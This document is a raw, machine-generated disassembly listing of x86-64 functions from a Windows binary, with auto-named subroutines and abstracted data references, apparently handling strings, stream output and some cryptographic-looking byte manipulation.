xor esi esi
cmp [ r12 + 0x8 ] rsi
cmove rsi r12
lea rcx [ rsp + 0x90 ]
call sub_14003828c
test rsi rsi
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rax rdi
add rsp 0x40
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
mov rax [ r14 ]
mov dl 0x9
mov rcx r14
call [ rax + 0x50 ]
movzx r11d ax
mov rcx [ rdi ]
movsxd rdx [ rcx + 0x4 ]
mov r8 [ rdx + rdi + 0x48 ]
mov rcx [ r8 + 0x48 ]
cmp [ rcx ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
mov eax [ rcx + rdi + 0x18 ]
and eax 0x1c0
mov r12d 0x4
mov r13d 0xffff
cmp eax 0x40
je r-xdata
mov rax [ rsi ]
mov edx 0x1
mov rcx rsi
call [ rax ]
dec rax
mov [ r12 + 0x8 ] rax
mov rax [ r8 ]
movzx edx r11w
mov rcx r8
call [ rax + 0x18 ]
movzx r11d ax
mov rcx [ r8 + 0x60 ]
cmp [ rcx ] 0x0
jle r-xdata
jmp r-xdata
test rsi rsi
jle r-xdata
test rsi rsi
jle r-xdata
dec [ rcx ]
mov rcx [ r8 + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r11w
jmp r-xdata
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
movzx r8d [ rcx + rdi + 0x58 ]
mov rcx [ rcx + rdi + 0x48 ]
mov rax [ rcx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
movzx r8d [ rcx + rdi + 0x58 ]
mov rcx [ rcx + rdi + 0x48 ]
mov rax [ rcx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
cmp r13w r11w
cmove ebx r12d
mov rax [ rcx ]
movzx edx r8w
call [ rax + 0x18 ]
movzx r8d ax
mov rax [ rcx + 0x60 ]
cmp [ rax ] ebx
jle r-xdata
mov rax [ rcx ]
movzx edx r8w
call [ rax + 0x18 ]
movzx r8d ax
mov rax [ rcx + 0x60 ]
cmp [ rax ] ebx
jle r-xdata
dec [ rax ]
mov rcx [ rcx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r8w
jmp r-xdata
mov [ rsp + 0x88 ] ebx
test ebx ebx
jne r-xdata
dec [ rax ]
mov rcx [ rcx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r8w
jmp r-xdata
cmp r13w r8w
cmove ebx r12d
mov [ rsp + 0x88 ] ebx
dec rsi
jmp r-xdata
cmp r13w r8w
cmove ebx r12d
dec rsi
jmp r-xdata
sub_140027300
mov rax rsp
push rbp
lea rbp [ rax - 0x5f ]
sub rsp 0xb0
mov [ rbp - 0x31 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x47 ] rax
mov rbx rcx
mov [ rbp - 0x29 ] rcx
xor edi edi
mov [ rbp - 0x39 ] edi
mov [ rcx ] rdi
mov [ rcx + 0x8 ] rdi
mov [ rcx + 0x10 ] rdi
mov [ rbp - 0x39 ] 0x1
lea rax [ sub_140027450 ]
mov [ rbp - 0x19 ] rax
mov esi 0x7
mov [ rbp + 0x7 ] rsi
mov [ rbp - 0x11 ] di
mov rcx [ r--data ]
mov [ rbp - 0x11 ] rcx
mov eax [ r--data ]
mov [ rbp - 0x9 ] eax
mov [ rbp - 0x1 ] 0x6
lea rax [ rbp - 0x11 ]
cmp rsi 0x8
cmovae rax rcx
mov [ rax + 0xc ] di
mov [ rbp + 0x2f ] rsi
mov [ rbp + 0x27 ] rdi
mov [ rbp + 0x17 ] di
xor r8d r8d
lea edx [ rdi + 0x50 ]
lea rcx [ rbp + 0x17 ]
call sub_1400025a0
lea rcx [ rbp + 0x17 ]
cmp [ rbp + 0x2f ] 0x8
cmovae rcx [ rbp + 0x17 ]
mov r8d 0xa0
lea rdx [ r--data ]
call sub_14003a8c0
mov [ rbp + 0x27 ] 0x50
lea rax [ rbp + 0x17 ]
cmp [ rbp + 0x2f ] 0x8
cmovae rax [ rbp + 0x17 ]
mov [ rax + 0xa0 ] di
lea rdx [ rbp - 0x19 ]
mov rcx rbx
call sub_140018d50
nop
cmp [ rbp + 0x2f ] 0x8
jb r-xdata
mov [ rbp + 0x2f ] rsi
mov [ rbp + 0x27 ] rdi
mov [ rbp + 0x17 ] di
cmp [ rbp + 0x7 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x17 ]
call j_sub_14003ad04
mov rax rbx
mov rcx [ rbp + 0x47 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0xb0 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
mov rcx [ rbp - 0x11 ]
call j_sub_14003ad04
sub_140027450
push rbx
sub rsp 0x60
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x58 ] rax
mov r9 [ rcx ]
mov rbx rcx
mov rcx [ rcx + 0x8 ]
cmp r9 rcx
je r-xdata
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
lea rdx [ r--data ]
mov rcx rax
sub rcx r9
mov rax 0x6666666666666667
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx 0x1
jb r-xdata
cmp rdx 0x2
ja r-xdata
cmp [ r9 + 0x18 ] 0x8
mov [ rsp + 0x78 ] rdi
jb r-xdata
xor eax eax
or rcx 0xffffffffffffffff
mov rdi r9
mov [ rsp + 0x38 ] 0x7
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x20 ] ax
[ rdi ]
mov rdx r9
not rcx
lea r8 [ rcx - 0x1 ]
lea rcx [ rsp + 0x20 ]
call sub_140001ea0
lea rdx [ rsp + 0x48 ]
lea rcx [ rsp + 0x20 ]
call sub_140028350
mov rdi [ rsp + 0x78 ]
test al al
je r-xdata
mov r9 [ r9 ]
mov al 0x1
mov rcx [ rsp + 0x58 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0x60
pop rbx
retn
mov rdx [ rbx + 0x8 ]
sub rdx 0x28
cmp [ rdx + 0x18 ] 0x8
jb r-xdata
lea rcx [ rsp + 0x20 ]
call sub_140001b50
lea rdx [ rsp + 0x48 ]
mov rcx rax
call sub_140027580
test al al
jne r-xdata
mov rdx [ rdx ]
lea rdx [ r--data ]
lea rcx [ rw-data ]
jmp r-xdata
call sub_14000ac10
mov rcx rax
call sub_140007970
sub_140027580
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x4b0 ]
sub rsp 0x5b0
mov [ rbp - 0x70 ] 0xfffffffffffffffe
mov [ rsp + 0x600 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x4a0 ] rax
mov r12 rdx
mov rbx rcx
mov [ rbp - 0x80 ] rcx
mov [ rbp - 0x68 ] rcx
xor dil dil
mov [ rsp + 0x30 ] dil
mov ecx 0x8
call sub_14003ac60
mov r15 rax
mov [ rsp + 0x50 ] rax
xor esi esi
test rax rax
je r-xdata
mov r15 rsi
mov [ rsp + 0x50 ] rsi
xor eax eax
mov [ r15 ] rax
jmp r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov [ r15 ] rsi
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rcx r15
call j_sub_14003ad04
nop
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rax [ r--data ]
mov [ rbp + 0x410 ] rax
mov rax [ r--data ]
mov [ rbp + 0x418 ] rax
mov rax [ r--data ]
mov [ rbp + 0x420 ] rax
mov rax [ r--data ]
mov [ rbp + 0x428 ] rax
mov rax [ r--data ]
mov [ rbp + 0x430 ] rax
mov eax [ r--data ]
mov [ rbp + 0x438 ] eax
movzx eax [ r--data ]
mov [ rbp + 0x43c ] ax
movzx eax [ r--data ]
mov [ rbp + 0x43e ] al
mov rax [ r--data ]
mov [ rbp + 0x440 ] rax
mov rax [ r--data ]
mov [ rbp + 0x448 ] rax
mov rax [ r--data ]
mov [ rbp + 0x450 ] rax
mov rax [ r--data ]
mov [ rbp + 0x458 ] rax
mov rax [ r--data ]
mov [ rbp + 0x460 ] rax
movzx eax [ r--data ]
mov [ rbp + 0x468 ] al
mov ecx 0x28
call sub_14003ac60
mov r14 rax
mov [ rsp + 0x70 ] rax
test rax rax
je r-xdata
mov rdx r15
call sub_140005490
test al al
je r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rsi
mov [ rbx ] si
movzx eax dil
mov rcx [ rbp + 0x4a0 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0x600 ]
add rsp 0x5b0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rcx [ rbx ]
call j_sub_14003ad04
mov r14 rsi
mov [ rsp + 0x70 ] rsi
mov [ rax + 0x18 ] 0xf
mov [ rax + 0x10 ] rsi
mov [ rax ] sil
jmp r-xdata
test r14 r14
je r-xdata
mov ecx 0x28
call sub_14003ac60
mov r13 rax
mov [ rsp + 0x78 ] rax
mov [ rsp + 0x68 ] rax
test rax rax
je r-xdata
mov rdx r14
mov rcx r15
call sub_140005680
test al al
je r-xdata
cmp [ r14 + 0x18 ] 0x10
jb r-xdata
mov r13 rsi
mov [ rsp + 0x78 ] rsi
mov [ rax + 0x18 ] 0xf
mov [ rax + 0x10 ] rsi
mov [ rax ] 0x0
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx r14
mov rcx rax
call sub_140005f40
jmp r-xdata
mov [ r14 + 0x18 ] 0xf
mov [ r14 + 0x10 ] rsi
mov [ r14 ] 0x0
mov rcx r14
call j_sub_14003ad04
mov rcx [ r14 ]
call j_sub_14003ad04
mov r15 rsi
mov [ rsp + 0x68 ] rsi
mov [ rax + 0x18 ] 0xf
mov [ rax + 0x10 ] rsi
mov [ rax ] 0x0
mov r8d 0x1
lea rdx [ r--data ]
mov rcx rax
call sub_140005c90
jmp r-xdata
mov r8d 0x14
lea rdx [ r--data ]
mov rcx r13
call sub_14000a5c0
mov ecx 0x28
call sub_14003ac60
mov r15 rax
mov [ rsp + 0x68 ] rax
mov [ rsp + 0x60 ] rax
test rax rax
je r-xdata
mov rbx rax
mov [ rsp + 0x40 ] rax
xor edx edx
lea r8d [ rdx + 0x58 ]
mov rcx rax
call sub_14003d760
mov [ rsp + 0x40 ] rbx
jmp r-xdata
mov [ rsp + 0x48 ] esi
mov rdi rsi
mov [ rsp + 0x38 ] rsi
xor sil sil
mov ecx 0x58
call sub_14003ac60
mov rbx rax
test rax rax
je r-xdata
mov r15 [ rsp + 0x50 ]
lea rax [ rsp + 0x48 ]
mov [ rsp + 0x20 ] rax
lea r9 [ rsp + 0x38 ]
mov r8 rbx
mov rdx r15
mov r15 [ rsp + 0x50 ]
mov rcx r15
call sub_1400058d0
movzx esi al
mov rdi [ rsp + 0x38 ]
jmp r-xdata
lea r8 [ rsp + 0x40 ]
mov rdx r13
mov rcx [ rsp + 0x50 ]
call sub_140005730
test al al
je r-xdata
mov rbx [ rsp + 0x68 ]
test rbx rbx
je r-xdata
lea rcx [ rbp - 0x60 ]
call sub_1400329b0
lea rdx [ rdi + 0x70 ]
mov r8d 0x10
lea rcx [ rbp - 0x60 ]
call sub_140032710
mov r8d 0x2f
lea rdx [ rbp + 0x410 ]
lea rcx [ rbp - 0x60 ]
call sub_140032710
mov r8d 0x10
mov rdx r12
lea rcx [ rbp - 0x60 ]
call sub_140032710
mov r8d 0x29
lea rdx [ rbp + 0x440 ]
lea rcx [ rbp - 0x60 ]
call sub_140032710
lea rdx [ rbp - 0x60 ]
lea rcx [ rbp + 0x470 ]
call sub_140032840
lea r8 [ rbp + 0x470 ]
mov edx 0x10
lea rcx [ rbp ]
call sub_140032e80
lea r8 [ rdi + 0x80 ]
lea r9 [ rbp + 0x480 ]
mov edx 0x20
lea rcx [ rbp ]
call sub_140032a00
mov rcx rdi
call j_sub_14003ad04#2
mov ecx 0x28
call sub_14003ac60
mov rsi rax
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x60 ] rax
xor r12d r12d
test rax rax
je r-xdata
mov rcx rbx
call j_sub_14003ad04
test sil sil
je r-xdata
xor esi esi
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov rsi r12
mov [ rsp + 0x38 ] r12
mov [ rax + 0x18 ] 0xf
mov [ rax + 0x10 ] r12
mov [ rax ] r12b
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx r14
mov rcx rax
call sub_140005f40
jmp r-xdata
movzx edi [ rsp + 0x30 ]
mov rbx [ rbp - 0x80 ]
cmp [ r13 + 0x18 ] 0x10
jb r-xdata
mov [ rbx + 0x18 ] 0xf
xor esi esi
mov [ rbx + 0x10 ] rsi
mov [ rbx ] sil
mov rcx rbx
call j_sub_14003ad04
jmp r-xdata
mov rcx [ rbx ]
call j_sub_14003ad04
mov rbx r12
mov [ rsp + 0x40 ] rbx
xor edx edx
lea r8d [ rdx + 0x58 ]
mov rcx rax
call sub_14003d760
jmp r-xdata
mov r8d 0x1a
lea rdx [ r--data ]
mov rcx rsi
call sub_14000a5c0
mov ecx 0x58
call sub_14003ac60
mov rbx rax
mov [ rsp + 0x40 ] rax
test rax rax
je r-xdata
mov [ r13 + 0x18 ] 0xf
mov [ r13 + 0x10 ] rsi
mov [ r13 ] 0x0
mov rcx r13
call j_sub_14003ad04
mov rcx [ r13 ]
call j_sub_14003ad04
test r13 r13
je r-xdata
mov rcx rbx
call j_sub_14003ad04
test rsi rsi
je r-xdata
mov ecx 0x20
call sub_14003ac60
mov rdi rax
mov [ rsp + 0x60 ] rax
test rax rax
je r-xdata
mov [ rsp + 0x48 ] rbx
lea r8 [ rsp + 0x48 ]
mov rdx rsi
mov rcx r15
call sub_140005730
test al al
je r-xdata
cmp [ rsi + 0x18 ] 0x10
jb r-xdata
mov rdi r12
mov [ rsp + 0x60 ] r12
mov [ rax ] r12
mov [ rax + 0x8 ] r12
mov [ rax + 0x10 ] r12
jmp r-xdata
mov [ rsi + 0x18 ] 0xf
mov [ rsi + 0x10 ] r12
mov [ rsi ] 0x0
mov rcx rsi
call j_sub_14003ad04
mov rcx [ rsi ]
call j_sub_14003ad04
test rdi rdi
je r-xdata
mov rbx [ rdi ]
cmp rbx [ rdi + 0x8 ]
je r-xdata
mov r8 rdi
mov rdx rbx
mov rcx r15
call sub_140005a90
test al al
je r-xdata
mov rcx rdi
call sub_140029340
mov rcx rdi
call j_sub_14003ad04
mov rbx [ rsp + 0x40 ]
nop [ rax + rax ] eax
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
test ecx ecx
je r-xdata
cmp rdi 0x5
jb r-xdata
mov r8d 0x5
cmp rdi r8
cmovb r8 rdi
lea rdx [ r--data ]
call sub_14003d8f0
movsxd rcx eax
test eax eax
jne r-xdata
add rbx 0x28
mov rdi [ rsp + 0x60 ]
cmp rbx [ rdi + 0x8 ]
jne r-xdata
mov ecx 0x28
call sub_14003ac60
mov [ rsp + 0x58 ] rax
test rax rax
je r-xdata
mov eax r12d
setne al
mov ecx eax
mov rdi [ rbx + 0x10 ]
cmp rdi rdi
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov r13 [ rsp + 0x78 ]
mov r14 [ rsp + 0x70 ]
mov r15 [ rsp + 0x50 ]
xor r13d r13d
mov r12d r13d
mov rdx rsi
mov rcx rax
call sub_14000e010
mov r12 rax
xor r13d r13d
jmp r-xdata
mov rsi r13
mov [ rax + 0x18 ] 0xf
mov [ rax + 0x10 ] r13
mov [ rax ] 0x0
mov r8d 0x1
lea rdx [ r--data ]
mov rcx rax
call sub_140005c90
jmp r-xdata
mov r8d 0x1
lea rdx [ r--data ]
mov rcx r12
call sub_14000a5c0
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rbx
mov rcx r12
call sub_14000aaf0
mov ecx 0x28
call sub_14003ac60
mov rsi rax
mov [ rsp + 0x58 ] rax
test rax rax
je r-xdata
mov rdi r13
mov [ rbp - 0x78 ] r13
xor edx edx
lea r8d [ rdx + 0x58 ]
mov rcx rax
call sub_14003d760
mov [ rbp - 0x78 ] rdi
jmp r-xdata
mov [ rsp + 0x48 ] r13d
mov r15 r13
mov [ rsp + 0x58 ] r13
xor r14b r14b
mov [ rsp + 0x30 ] r14b
mov ecx 0x58
call sub_14003ac60
mov rdi rax
test rax rax
je r-xdata
mov rcx rdi
call j_sub_14003ad04
test r14b r14b
je r-xdata
lea rax [ rsp + 0x48 ]
mov [ rsp + 0x20 ] rax
lea r9 [ rsp + 0x58 ]
mov r8 rdi
mov rdx rsi
mov rcx r13
call sub_1400058d0
movzx r14d al
mov [ rsp + 0x30 ] al
mov r15 [ rsp + 0x58 ]
lea r8 [ rbp - 0x78 ]
mov rdx r12
mov r13 [ rsp + 0x50 ]
mov rcx r13
call sub_140005730
test al al
je r-xdata
test r12 r12
je r-xdata
mov edx 0xa
lea rsi [ rw-data ]
mov rcx rsi
call sub_1400085e0
xor eax eax
mov edi eax
mov rax [ rw-data ]
movsxd rcx [ rax + 0x4 ]
test [ rcx + rsi + 0x10 ] 0x6
jne r-xdata
xor r12d r12d
mov rsi [ rsp + 0x38 ]
cmp [ r12 + 0x18 ] 0x10
jb r-xdata
movsxd rcx [ rax + 0x4 ]
add rcx rsi
test edi edi
je r-xdata
mov rcx [ rcx + rsi + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
cmp eax 0xffffffff
mov eax 0x4
cmove edi eax
mov rax [ rw-data ]
mov [ r12 + 0x18 ] 0xf
xor eax eax
mov [ r12 + 0x10 ] rax
mov [ r12 ] al
mov rcx r12
call j_sub_14003ad04
mov rcx [ r12 ]
call j_sub_14003ad04
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
xor r8d r8d
call sub_140003120
or edx 0x4
xor esi esi
mov edi esi
movsxd rcx esi
add rcx r15
mov [ rax + 0x18 ] 0x7
xor esi esi
mov [ rax + 0x10 ] rsi
mov [ rax ] si
mov eax r13d
cdq
sub eax edx
sar eax 0x1
movsxd r8 eax
mov rdx rcx
mov rcx rdi
call sub_140001ea0
jmp r-xdata
xor edx edx
lea r8d [ rdx + 0x10 ]
call sub_14003d528
mov r14d eax
lea rdx [ r--data ]
mov rcx rsi
call sub_14000ac10
mov rcx rax
mov edx r14d
call sub_140008400
mov rcx rax
call sub_140007970
mov r13d [ r15 + 0x10 ]
movzx esi [ r15 + 0xc ]
add esi 0xcc
mov ecx 0x28
call sub_14003ac60
mov rdi rax
mov [ rsp + 0x58 ] rax
test rax rax
je r-xdata
lea rdx [ r--data ]
mov rcx r13
call sub_14000ac10
mov [ rsp + 0x20 ] 0x0
mov r9d r14d
mov r8d 0x9c
mov rdx r15
lea rcx [ rbp + 0x480 ]
call sub_140027ed0
lea rdx [ r--data ]
mov rcx r13
call sub_14000ac10
mov [ rsp + 0x20 ] 0x1
mov r9d r14d
mov r8d 0xa8
mov rdx r15
lea rcx [ rbp + 0x480 ]
call sub_140027ed0
mov rcx r15
call j_sub_14003ad04
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
lea rdx [ r--data ]
lea r13 [ rw-data ]
mov rcx r13
call sub_14000ac10
mov rcx rax
mov rdx rdi
call sub_14000ae70
mov rcx rax
call sub_140007970
test rdi rdi
je r-xdata
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] rsi
mov [ rdi ] si
mov rcx rdi
call j_sub_14003ad04
mov rcx [ rdi ]
call j_sub_14003ad04
sub_140027ed0
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x528 ]
sub rsp 0x628
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x510 ] rax
mov rax [ r--data ]
movzx r14d [ rbp + 0x590 ]
mov r13 rcx
mov [ rbp + 0x4d0 ] rax
movzx eax [ r--data ]
mov edi r9d
mov [ rbp + 0x4d8 ] ax
movzx eax [ r--data ]
mov esi r8d
mov [ rbp + 0x4da ] al
mov rax [ r--data ]
movzx r8d dil
mov [ rbp + 0x4c0 ] rax
movzx eax [ r--data ]
mov r12 rdx
mov [ rbp + 0x4c8 ] ax
movzx eax [ r--data ]
mov ebx r9d
mov [ rbp + 0x4ca ] al
shr ebx 0x8
and r8b 0x1
movzx eax bl
movzx edx bl
mov r11d r9d
shr al 0x2
shr r11d 0x10
and dl 0x3
movzx ecx r11b
mov r10d r9d
shl r8b 0x6
or r8b al
shr r10d 0x18
and cl 0x7
movzx eax r11b
shl cl 0x4
shl dl 0x5
shr al 0x3
mov [ rsp + 0x20 ] r9d
shr r9b 0x1
or dl al
movzx eax r10b
and r10b 0xf
shr al 0x4
shl r10b 0x3
add r9b r9b
or cl al
movzx eax dil
and dil 0x1f
shr al 0x5
add cl cl
shl dil 0x2
or r10b al
movzx eax bl
and bl 0x3f
shr al 0x6
add bl bl
mov [ rbp + 0x4bb ] cl
or dil al
movzx eax r11b
and r11b 0x7f
shr al 0x7
add r8b r8b
add dl dl
or bl al
add r10b r10b
add r11b r11b
lea rcx [ rbp + 0x4b8 ]
add dil dil
add bl bl
mov [ rbp + 0x4b8 ] r9b
mov [ rbp + 0x4b9 ] r8b
mov [ rbp + 0x4ba ] dl
mov [ rbp + 0x4be ] bl
mov [ rbp + 0x4bc ] r10b
mov [ rbp + 0x4bd ] dil
mov [ rbp + 0x4bf ] r11b
call sub_140032350
mov edi [ rsp + 0x20 ]
mov r11d edi
mov ebx edi
shr r11d 0x18
movzx r8d r11b
movzx eax dil
movzx edx dil
shr al 0x2
mov r10d edi
movzx r9d r11b
shr r10d 0x10
shr ebx 0x8
and r8b 0x1
and dl 0x3
movzx ecx bl
shl r8b 0x6
or r8b al
and cl 0x7
movzx eax bl
shr al 0x3
shl cl 0x4
shl dl 0x5
or dl al
movzx eax r10b
and r10b 0xf
shr al 0x4
shl r10b 0x3
shr r9b 0x1
or cl al
movzx eax r11b
and r11b 0x1f
shr al 0x5
shl r11b 0x2
add cl cl
or r10b al
movzx eax dil
and dil 0x3f
shr al 0x6
add dil dil
mov [ rbp + 0x4b3 ] cl
or r11b al
movzx eax bl
add r9b r9b
shr al 0x7
add r8b r8b
add dl dl
or dil al
add r10b r10b
add r11b r11b
and bl 0x7f
lea rcx [ rbp + 0x4b0 ]
add dil dil
add bl bl
mov [ rbp + 0x4b0 ] r9b
mov [ rbp + 0x4b1 ] r8b
mov [ rbp + 0x4b6 ] dil
mov [ rbp + 0x4b2 ] dl
mov [ rbp + 0x4b4 ] r10b
mov [ rbp + 0x4b5 ] r11b
mov [ rbp + 0x4b7 ] bl
call sub_140032350
lea rdx [ rbp - 0x60 ]
lea rcx [ rbp + 0x4b8 ]
call sub_1400326e0
lea rdx [ rbp + 0x20 ]
lea rcx [ rbp + 0x4b0 ]
call sub_1400326e0
mov ebx [ rsi + r12 ]
mov r11d esi
add ebx 0xd0
cmp [ r11 + r12 + 0x4 ] 0x14
mov r15d 0x4
lea rsi [ rw-data ]
jne r-xdata
mov rax [ rw-data ]
mov edx 0xa
movsxd rcx [ rax + 0x4 ]
add rcx rsi
and [ rcx + 0x18 ] 0xfffff3ff
or [ rcx + 0x18 ] 0x200
mov rcx rsi
call sub_1400085e0
mov rax [ rw-data ]
xor ebx ebx
movsxd rcx [ rax + 0x4 ]
test [ rcx + rsi + 0x10 ] 0x6
jne r-xdata
lea rcx [ rsp + 0x40 ]
call sub_1400329b0
mov edi 0x10
lea rcx [ rsp + 0x40 ]
mov r8d edi
mov rdx r13
call sub_140032710
lea rdx [ rsp + 0x20 ]
lea rcx [ rsp + 0x40 ]
mov r8d r15d
call sub_140032710
lea rax [ rbp + 0x4c0 ]
lea rdx [ rbp + 0x4d0 ]
test r14b r14b
lea r8d [ r15 + 0x7 ]
lea rcx [ rsp + 0x40 ]
cmove rdx rax
call sub_140032710
lea rdx [ rsp + 0x40 ]
lea rcx [ rbp + 0x500 ]
call sub_140032840
lea r8 [ rbp + 0x500 ]
lea rcx [ rbp + 0xa0 ]
mov edx edi
call sub_140032e80
movsxd r8 ebx
lea r9 [ rbp + 0x4f0 ]
lea rcx [ rbp + 0xa0 ]
add r8 r12
mov edx edi
call sub_140032a00
lea r8 [ rbp - 0x60 ]
lea rdx [ rbp + 0x4e0 ]
lea rcx [ rbp + 0x4f0 ]
xor r9d r9d
call sub_140033150
lea r8 [ rbp + 0x20 ]
lea rdx [ rbp + 0x4e8 ]
lea rcx [ rbp + 0x4f8 ]
xor r9d r9d
call sub_140033150
lea rbx [ rbp + 0x4e0 ]
lea r12d [ r15 + 0x2c ]
nop [ rax + rax ] ax
movsxd rcx [ rax + 0x4 ]
add rcx rsi
test ebx ebx
je r-xdata
mov rcx [ rcx + rsi + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
cmp eax 0xffffffff
mov rax [ rw-data ]
cmove ebx r15d
lea rcx [ rsp + 0x28 ]
mov edx 0x2
call sub_140039e70
mov rcx [ rw-data ]
movsxd rcx [ rcx + 0x4 ]
mov rdx [ rax + 0x8 ]
add rcx rsi
call [ rax ]
mov r11 [ rw-data ]
movsxd rax [ r11 + 0x4 ]
mov [ rax + rsi + 0x58 ] r12w
mov rax [ rw-data ]
movsxd rcx [ rax + 0x4 ]
add rcx rsi
and [ rcx + 0x18 ] 0xfffff9ff
or [ rcx + 0x18 ] 0x800
movzx edx [ rbx ]
mov rcx rsi
call sub_140010430
inc rbx
dec rdi
jne r-xdata
mov al 0x1
mov rcx [ rbp + 0x510 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0x628
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
xor r8d r8d
call sub_140003120
or edx r15d
sub_140028350
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x60
mov [ rsp + 0x40 ] 0xfffffffffffffffe
mov [ rsp + 0xb0 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x50 ] rax
mov r14 rdx
mov r12 rcx
mov [ rsp + 0x28 ] rcx
mov [ rsp + 0x48 ] rcx
xor bl bl
mov ecx 0x8
call sub_14003ac60
mov rsi rax
xor r15d r15d
test rax rax
je r-xdata
mov rsi r15
xor eax eax
mov [ rsi ] rax
jmp r-xdata
mov rcx r12
mov rcx [ r12 ]
jmp r-xdata
mov [ rsi ] r15
cmp [ r12 + 0x18 ] 0x8
jb r-xdata
mov rcx rsi
call j_sub_14003ad04
nop
cmp [ r12 + 0x18 ] 0x8
jb r-xdata
mov ecx 0x28
call sub_14003ac60
mov rdi rax
test rax rax
je r-xdata
mov rdx rsi
call sub_140005490
test al al
je r-xdata
mov [ r12 + 0x18 ] 0x7
mov [ r12 + 0x10 ] r15
mov [ r12 ] r15w
movzx eax bl
mov rcx [ rsp + 0x50 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0xb0 ]
add rsp 0x60
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rcx [ r12 ]
call j_sub_14003ad04
mov rdi r15
mov [ rax + 0x18 ] 0xf
mov [ rax + 0x10 ] r15
mov [ rax ] r15b
jmp r-xdata
test rdi rdi
je r-xdata
mov [ rsp + 0x20 ] r15d
lea r8 [ rsp + 0x20 ]
mov rdx rdi
mov rcx rsi
call sub_140028bf0
test al al
je r-xdata
mov rdx rdi
mov rcx rsi
call sub_140005680
test al al
je r-xdata
mov rcx [ rsi ]
test rcx rcx
je r-xdata
cmp [ rdi + 0x18 ] 0x10
jb r-xdata
mov ecx 0xf8
call sub_14003ac60
mov [ rsp + 0x30 ] rax
test rax rax
je r-xdata
call j_sub_14003ad04#2
mov [ rdi + 0x18 ] 0xf
mov [ rdi + 0x10 ] r15
mov [ rdi ] 0x0
mov rcx rdi
call j_sub_14003ad04
mov rcx [ rdi ]
call j_sub_14003ad04
mov rbx r15
mov rcx rax
call sub_140028ff0
mov rbx rax
jmp r-xdata
mov edx 0x3
lea rcx [ rsp + 0x30 ]
call sub_140039e70
mov r13 rax
mov rdx rdi
mov rcx rbp
call sub_14002b170
mov rcx rax
call sub_14002b3a0
mov rbp rax
test rax rax
jne r-xdata
mov rbp r15
test rbx rbx
lea rbp [ rbx + 0x10 ]
jne r-xdata
mov rax [ rax ]
movsxd rcx [ rax + 0x4 ]
add rcx rbp
mov rcx r15
jmp r-xdata
mov rbp r15
mov rdx rax
mov rcx rbx
call sub_140029190
mov rbp rax
jmp r-xdata
mov rdx [ r13 + 0x8 ]
call [ r13 ]
mov r11 [ rbp ]
movsxd rax [ r11 + 0x4 ]
mov [ rax + rbp + 0x58 ] 0x30
mov edx [ rsp + 0x20 ]
mov rcx rbp
call sub_140028df0
mov ecx 0x28
call sub_14003ac60
mov [ rsp + 0x30 ] rax
test rax rax
je r-xdata
mov ecx 0x28
call sub_14003ac60
mov rbx rax
test rax rax
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
add rcx rbx
mov rax [ rcx ]
mov edx 0x1
call [ rax ]
test rbx rbx
